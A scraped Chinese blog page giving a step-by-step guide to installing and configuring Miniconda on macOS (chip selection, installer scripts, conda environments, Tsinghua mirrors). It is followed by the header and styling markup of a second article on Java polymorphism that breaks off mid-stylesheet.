                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读4分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252933}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px}.markdown-body h1{font-size:24px;line-height:38px;margin-bottom:5px}.markdown-body h2{font-size:22px;line-height:34px;padding-bottom:12px;border-bottom:1px solid #ececec}.markdown-body h3{font-size:20px;line-height:28px}.markdown-body h4{font-size:18px;line-height:26px}.markdown-body h5{font-size:17px;line-height:24px}.markdown-body h6{font-size:16px;line-height:24px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #ddd;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#fff5f5;color:#ff502c;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#333;background:#f8f8f8}.markdown-body a{text-decoration:none;color:#0269c8;border-bottom:1px solid #d1e9ff}.markdown-body a:active,.markdown-body a:hover{color:#275b8c}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #f6f6f6}.markdown-body thead{background:#f6f6f6;color:#000;text-align:left}.markdown-body tr:nth-child(2n){background-color:#fcfcfc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#666;padding:1px 23px;margin:22px 0;border-left:4px solid #cbcbcb;background-color:#f8f8f8}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}@media (max-width:720px){.markdown-body h1{font-size:24px}.markdown-body h2{font-size:20px}.markdown-body h3{font-size:18px}}</style><style data-highlight="" data-highlight-key="juejin">.markdown-body pre,.markdown-body pre&gt;code.hljs{color:#333;background:#f8f8f8}.hljs-comment,.hljs-quote{color:#998;font-style:italic}.hljs-keyword,.hljs-selector-tag,.hljs-subst{color:#333;font-weight:700}.hljs-literal,.hljs-number,.hljs-tag .hljs-attr,.hljs-template-variable,.hljs-variable{color:teal}.hljs-doctag,.hljs-string{color:#d14}.hljs-section,.hljs-selector-id,.hljs-title{color:#900;font-weight:700}.hljs-subst{font-weight:400}.hljs-class .hljs-title,.hljs-type{color:#458;font-weight:700}.hljs-attribute,.hljs-name,.hljs-tag{color:navy;font-weight:400}.hljs-link,.hljs-regexp{color:#009926}.hljs-bullet,.hljs-symbol{color:#990073}.hljs-built_in,.hljs-builtin-name{color:#0086b3}.hljs-meta{color:#999;font-weight:700}.hljs-deletion{background:#fdd}.hljs-addition{background:#dfd}.hljs-emphasis{font-style:italic}.hljs-strong{font-weight:700}</style><p>为Mac安装Miniconda，关键在于下载与芯片匹配的安装包，并正确运行脚本。</p>
<p>以下是完整的安装和使用步骤。</p>
<h2 data-id="heading-0">第一步：确认芯片与下载</h2>
<p>首先，你需要确认Mac的处理器类型，以选择正确的安装包。</p>
<ol>
<li>点击屏幕左上角苹果菜单，选择 <strong>关于本机</strong>。</li>
<li>查看“芯片”一项。
<ul>
<li>如果显示 <strong>Apple M系列</strong>，请下载 <strong>Miniconda3 macOS Apple M1 64-bit pkg</strong>（或 arm64 版本）。</li>
<li>如果显示 <strong>Intel</strong>，请下载 <strong>Miniconda3 macOS Intel x86 64-bit pkg</strong>（或 x86_64 版本）。</li>
</ul>
</li>
</ol>
<p>你可以从 <a href="https://link.juejin.cn?target=https%3A%2F%2Fdocs.conda.io%2Fen%2Flatest%2Fminiconda.html" target="_blank" title="https://docs.conda.io/en/latest/miniconda.html" ref="nofollow noopener noreferrer">Miniconda 官方网站</a> 下载。如果下载速度慢，可以使用国内的 <a href="https://link.juejin.cn?target=https%3A%2F%2Fmirrors.tuna.tsinghua.edu.cn%2Fanaconda%2Fminiconda%2F" target="_blank" title="https://mirrors.tuna.tsinghua.edu.cn/anaconda/miniconda/" ref="nofollow noopener noreferrer">清华大学开源软件镜像站</a>。</p>
<h2 data-id="heading-1">第二步：安装与初始化</h2>
<p>下载完成后，根据你下载的文件类型选择安装方法：</p>
<p><strong>方法A：使用 <code>.pkg</code> 安装包（推荐新手）</strong>
这是图形化安装方式。双击下载的 <code>.pkg</code> 文件，跟随安装向导的提示完成即可。</p>
<p><strong>方法B：使用 <code>.sh</code> 脚本安装（适用于命令行）</strong>
如果你下载的是 <code>.sh</code> 脚本，或更喜欢命令行，请按以下步骤操作：</p>
<ol>
<li>打开“终端”应用（可在“应用程序”&gt;“实用工具”中找到）。</li>
<li>进入脚本所在目录（通常在“下载”文件夹）：
<pre><code class="hljs language-bash" lang="bash"><span class="hljs-built_in">cd</span> ~/Downloads
</code></pre>
</li>
<li>运行安装脚本：
<pre><code class="hljs language-bash" lang="bash">bash Miniconda3-latest-MacOSX-x86_64.sh <span class="hljs-comment"># Intel芯片</span>
<span class="hljs-comment"># 或</span>
bash Miniconda3-latest-MacOSX-arm64.sh   <span class="hljs-comment"># Apple Silicon芯片</span>
</code></pre>
</li>
<li>安装过程中，需要：
<ul>
<li>按回车阅读许可协议，然后输入 <code>yes</code> 同意。</li>
<li>按回车使用默认安装路径（通常是 <code>~/miniconda3</code>）。</li>
<li>在询问 <strong>“是否希望安装程序初始化 Miniconda3”</strong> 时，务必输入 <code>yes</code>，这会将conda命令自动配置到你的shell中。</li>
</ul>
</li>
</ol>
<p><strong>静默安装选项</strong>：你也可以使用以下命令进行无需交互的静默安装（同样适用于脚本方式）：</p>
<pre><code class="hljs language-bash" lang="bash">bash ~/miniconda3/miniconda.sh -b -u -p ~/miniconda3
</code></pre>
<h2 data-id="heading-2">第三步：验证与基本使用</h2>
<p>安装完成后，<strong>关闭并重新打开终端</strong>。你会看到命令行提示符前出现了 <code>(base)</code>，这表示已自动进入Miniconda的基础环境。</p>
<ol>
<li><strong>验证安装</strong>：输入以下命令，如显示版本号则安装成功。
<pre><code class="hljs language-bash" lang="bash">conda --version
</code></pre>
</li>
<li><strong>创建一个独立的Python环境</strong>（例如，用于特定项目）：
<pre><code class="hljs language-bash" lang="bash">conda create -n my_env python=3.10
</code></pre>
<ul>
<li><code>my_env</code> 是你自定义的环境名。</li>
<li><code>python=3.10</code> 是指定的Python版本，可按需更改。</li>
</ul>
</li>
<li><strong>激活与退出环境</strong>：
<pre><code class="hljs language-bash" lang="bash">conda activate my_env  <span class="hljs-comment"># 激活环境</span>
conda deactivate       <span class="hljs-comment"># 退出当前环境</span>
</code></pre>
</li>
</ol>
<h2 data-id="heading-3">第四步：实用配置（可选但建议）</h2>
<p>为了获得更好的体验，建议进行以下配置：</p>
<ul>
<li><strong>配置国内镜像源</strong>：在国内使用，可以添加清华镜像来加速包下载。
<pre><code class="hljs language-bash" lang="bash">conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/main/
conda config --add channels https://mirrors.tuna.tsinghua.edu.cn/anaconda/pkgs/free/
conda config --<span class="hljs-built_in">set</span> show_channel_urls <span class="hljs-built_in">yes</span>
</code></pre>
</li>
<li><strong>安装常用包</strong>：在激活的环境中，可以使用 <code>conda install package_name</code> 命令安装所需软件包，如 <code>numpy</code>, <code>pandas</code>。</li>
</ul>
<h2 data-id="heading-4">安装与使用注意事项</h2>
<ul>
<li><strong>确保下载正确的安装包</strong>：这是最关键的一步，芯片类型选错会导致安装失败或后续兼容性问题。</li>
<li><strong>关于初始化</strong>：在安装脚本的最后一步，<strong>强烈建议同意初始化（输入<code>yes</code>）</strong>。如果错过，可以后续在终端手动运行 <code>conda init</code> 来修复。</li>
<li><strong>Intel芯片Mac的特殊情况</strong>：即使你是Intel芯片的Mac，如果某些软件要求<code>x86_64</code>架构，在创建环境时可以运行 <code>CONDA_SUBDIR=osx-64 conda create -n env_name python=3.10</code> 来确保兼容性。</li>
<li><strong>环境管理</strong>：建议为每个项目创建独立的环境，并使用 <code>conda env list</code> 查看所有环境。</li>
</ul>
<p>如果在安装后打开终端没有看到<code>(base)</code>，或者遇到<code>conda: command not found</code>的错误，通常是因为初始化步骤未完成。请重新打开终端并尝试运行 <code>conda init</code>，然后再次重启终端即可。</p>
<p>希望这份详细的指南能帮助你顺利完成安装！如果你在某个具体步骤遇到问题，例如环境激活失败或镜像配置出错，可以告诉我，我能提供更具体的排查建议。</p></div></div></article> <div class="article-end" data-v-539963b4="" data-v-61fb5e44=""><div class="rank-entry-bottom" data-v-539963b4="" data-v-61fb5e44=""><!----></div> <div class="tag-list-box" data-v-539963b4="" data-v-61fb5e44=""><!----><!----><!----></div></div> <!----><!----><!----><!----><!----><style>	.markdown-body { color: #828182;}</style>]]></description></item><item>    <title><![CDATA[深入理解 Java 多态：解锁面向对象编程的灵活性]]></title>    <link>https://juejin.cn/post/7581423932613443624</link>    <guid>https://juejin.cn/post/7581423932613443624</guid>    <pubDate>2025-12-09T03:32:46.000Z</pubDate>    <description><![CDATA[<article itemscope="itemscope" itemtype="http://schema.org/Article" data-entry-id="7581423932613443624" data-draft-id="7581437632854097960" data-original-type="0" class="article" data-v-61fb5e44=""><!----> <meta itemprop="headline" content="深入理解 Java 多态：解锁面向对象编程的灵活性"/> <meta itemprop="keywords" content="Java"/> <meta itemprop="datePublished" content="2025-12-09T03:32:46.000Z"/> <meta itemprop="image" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-128.png~tplv-t2oaga2asx-image.image"/> <div itemprop="author" itemscope="itemscope" itemtype="http://schema.org/Person"><meta itemprop="name" content="吃西红柿长大的番茄"/> <meta itemprop="url" content="https://juejin.cn/user/3097787706900985"/></div> <div itemprop="publisher" itemscope="itemscope" itemtype="http://schema.org/Organization"><meta itemprop="name" content="掘金"/> <div itemprop="logo" itemscope="itemscope" itemtype="https://schema.org/ImageObject"><meta itemprop="url" content="https://p1-jj.byteimg.com/tos-cn-i-t2oaga2asx/gold-assets/icon/icon-white-180.png~tplv-t2oaga2asx-image.image"/> <meta itemprop="width" content="180"/> <meta itemprop="height" content="180"/></div></div> <h1 class="article-title" data-v-61fb5e44="">
            深入理解 Java 多态：解锁面向对象编程的灵活性
            <!----> <!----></h1> <div class="author-info-block block-hidden" data-v-61fb5e44=""><div class="author-info-box" data-v-61fb5e44=""><div class="author-name" data-v-61fb5e44=""><a href="/user/3097787706900985/posts" target="_blank" rel="" class="jj-link username username ellipsis" data-v-65b50b51="" data-v-292f6e48="" data-v-61fb5e44=""><span class="name" style="max-width:160px;" data-v-65b50b51="" data-v-292f6e48="">
    吃西红柿长大的番茄
  </span> <!----> <!----> <!----> </a></div> <div class="meta-box" data-v-61fb5e44=""><time datetime="2025-12-09T03:32:46.000Z" title="Tue Dec 09 2025 03:32:46 GMT+0000 (Coordinated Universal Time)" class="time" data-v-61fb5e44="">
                    2025-12-09
                  </time> <svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" class="read-icon" data-v-61fb5e44=""><path d="M7.90078 2.80078C4.49278 2.80078 1.74745 6.11672 0.800781 7.77469C1.74745 9.58339 4.49278 13.2008 7.90078 13.2008C11.3088 13.2008 14.0541 9.58339 15.0008 7.77469C14.0541 6.11672 11.3088 2.80078 7.90078 2.80078Z" stroke="currentColor" data-v-61fb5e44=""/><circle cx="7.89922" cy="8.00078" r="2.2" stroke="currentColor" data-v-61fb5e44=""/></svg> <span class="views-count" data-v-61fb5e44="">
                    0
                  </span> <span class="read-time" data-v-61fb5e44=""><svg width="16" height="16" viewbox="0 0 16 16" fill="none" xmlns="http://www.w3.org/2000/svg" data-v-61fb5e44=""><rect width="16" height="16" fill="none" data-v-61fb5e44=""/><circle cx="8" cy="8" r="5.65625" stroke="#8A919F" data-v-61fb5e44=""/><path d="M7.69141 5.18652V8.30924H10.8141" stroke="#8A919F" stroke-linecap="round" stroke-linejoin="round" data-v-61fb5e44=""/></svg>
                    阅读5分钟
                  </span> <!----></div></div> <div style="flex:1;" data-v-61fb5e44=""/> <!----> <!----></div> <!----> <!----> <!----> <!----> <div id="article-root" itemprop="articleBody" class="main" data-v-61fb5e44=""><div class="article-viewer markdown-body result"><style>@charset "UTF-8";.markdown-body{word-break:break-word;line-height:1.75;font-weight:400;font-size:16px;overflow-x:hidden;color:#252b3a}.markdown-body h1,.markdown-body h2,.markdown-body h3,.markdown-body h4,.markdown-body h5,.markdown-body h6{line-height:1.5;margin-top:35px;margin-bottom:10px;padding-bottom:5px;color:#5e7ce0}.markdown-body h1{font-size:24px;margin-bottom:5px;margin-top:80px;position:relative;text-align:center}.markdown-body h2{font-size:20px;padding-bottom:12px;border-bottom:1px solid #dfe1e6}.markdown-body h3{font-size:18px;padding-bottom:0}.markdown-body h4{font-size:16px;margin-top:30px}.markdown-body h5{font-size:14px;margin-top:20px}.markdown-body h6{font-size:14px;margin-top:5px}.markdown-body p{line-height:inherit;margin-top:22px;margin-bottom:22px}.markdown-body img{max-width:100%}.markdown-body hr{border:none;border-top:1px solid #dfe1e6;margin-top:32px;margin-bottom:32px}.markdown-body code{word-break:break-word;border-radius:2px;overflow-x:auto;background-color:#ffeeed;color:#c73636;font-size:.87em;padding:.065em .4em}.markdown-body code,.markdown-body pre{font-family:Menlo,Monaco,Consolas,Courier New,monospace}.markdown-body pre{overflow:auto;position:relative;line-height:1.75}.markdown-body pre&gt;code{font-size:12px;padding:15px 12px;margin:0;word-break:normal;display:block;overflow-x:auto;color:#252b3a;background:#f8f8f8}.markdown-body a{position:relative;text-decoration:none;color:#5e7ce0;padding-right:18px;padding-bottom:4px}.markdown-body a[href^=http]:after{position:absolute;display:inline-block;width:16px;height:16px;margin-left:2px;margin-top:6px;content:"";background:url("data:image/png;base64,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");background-size:100%}.markdown-body a:active,.markdown-body a:hover{border-bottom:2px solid #5e7ce0}.markdown-body table{display:inline-block!important;font-size:12px;width:auto;max-width:100%;overflow:auto;border:1px solid #5e7ce0;border-spacing:0}.markdown-body thead{color:#fff;text-align:left}.markdown-body thead tr{background:#5e7ce0}.markdown-body thead th{border-bottom:1px solid #dfe1e6}.markdown-body tr{background-color:#fff}.markdown-body tr:nth-child(2n){background-color:#f2f5fc}.markdown-body td,.markdown-body th{padding:12px 7px;line-height:24px}.markdown-body td{min-width:120px}.markdown-body blockquote{color:#252b3a;padding:1px 23px;margin:22px 0;border-left:4px solid #5e7ce0;background-color:#f2f5fc}.markdown-body blockquote:after{display:block;content:""}.markdown-body blockquote&gt;p{margin:10px 0}.markdown-body ol,.markdown-body ul{padding-left:28px}.markdown-body ol li,.markdown-body ul li{padding-left:10px;margin-bottom:0;list-style:inherit}.markdown-body ol li .task-list-item,.markdown-body ul li .task-list-item{list-style:none}.markdown-body ol li .task-list-item ol,.markdown-body ol li .task-list-item ul,.markdown-body ul li .task-list-item ol,.markdown-body ul li .task-list-item ul{margin-top:0}.markdown-body ol li::marker,.markdown-body ul li::marker{color:#5e7ce0}.markdown-body ol ol,.markdown-body ol ul,.markdown-body ul ol,.markdown-body ul ul{margin-top:3px}.markdown-body ol li{padding-left:6px}.markdown-body ul li::marker{content:"•";color:#5e7ce0}.markdown-body .contains-task-list{padding-left:0}.markdown-body .task-list-item{list-style:none}.markdown-body input[type=checkbox]:before{display:inline-block;width:16px;height:16px;content:"";background:url("data:image/png;base64,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